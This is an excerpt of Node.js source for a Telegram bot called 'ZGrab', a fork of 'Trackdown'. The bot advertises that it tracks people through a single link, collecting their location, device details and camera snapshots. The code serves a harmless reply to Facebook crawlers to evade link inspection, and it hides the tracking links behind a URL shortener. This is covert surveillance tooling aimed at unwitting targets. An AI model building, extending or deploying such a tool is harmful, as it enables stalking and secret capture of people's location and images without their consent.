...
app.get("/w/:path/:uri", (req, res) => {
    ...
    if (user_agent.includes("facebook") || user_agent.includes("SupportsFresco")){
        console.log("Facebook Hit");
        res.send("Hello FB people!");
        return;
    }
...
bot.on('message', async (msg) => {
    ...
    if (msg.text == "/start") {
        ...
        bot.sendMessage(chatId, `Weclcome to *ZGrab*\n\nThis is fork of OSS project named Trackdown`, message_options)
        bot.sendMessage(chatId, `Owner: @zubayer_rahaman204`)
        bot.sendMessage(chatId, `Hola ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`, m);
...
async function createLink(cid, msg) {
    ...
    if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
        ...
        if (use1pt) {
            var x = await fetch(`https://api.shrtco.de/v2/shorten?url=${encodeURIComponent(cUrl)}`).then(res => res.json());
            var y = await fetch(`https://api.shrtco.de/v2/shorten?url=${encodeURIComponent(wUrl)}`).then(res => res.json());

            console.log(x);
            console.log(y);
            var f = x['result']['full_short_link'],
                g = y['result']['full_short_link'];
